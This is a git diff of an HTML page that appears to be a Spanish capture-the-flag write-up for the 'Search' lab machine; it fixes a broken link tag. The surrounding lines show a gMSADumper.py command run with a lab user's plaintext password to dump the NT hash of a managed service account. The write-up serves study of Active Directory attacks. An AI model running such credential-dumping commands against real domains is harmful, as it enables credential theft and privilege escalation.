@@ -720,7 +720,7 @@ PS C:\Users\Administrator\Documents></span>
 <section class="post" id="altern-administrator">
 <br><h3 class="post-title">Alternativa - Administrator</h3><br>
 
-<p class="plain-text">Como alternativa para no tener que obtener la <code class="language-plaintext highlighter-rouge">powershell</code> desde la web podemos dumpear directamente el hash NT de <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> con <a href="https://github.com/micahvandeusen/gMSADumper">gMSADumper.py</code></p>
+<p class="plain-text">Como alternativa para no tener que obtener la <code class="language-plaintext highlighter-rouge">powershell</code> desde la web podemos dumpear directamente el hash NT de <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> con <a href="https://github.com/micahvandeusen/gMSADumper">gMSADumper.py</a></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">gMSADumper.py -u Sierra.Frye -p </span><span class="am">'$$49=wide=STRAIGHT=jordan=28$$18'</span><span class="p"> -d search.htb -l search.htb  
 Users or groups who can read password for BIR-ADFS-GMSA$:
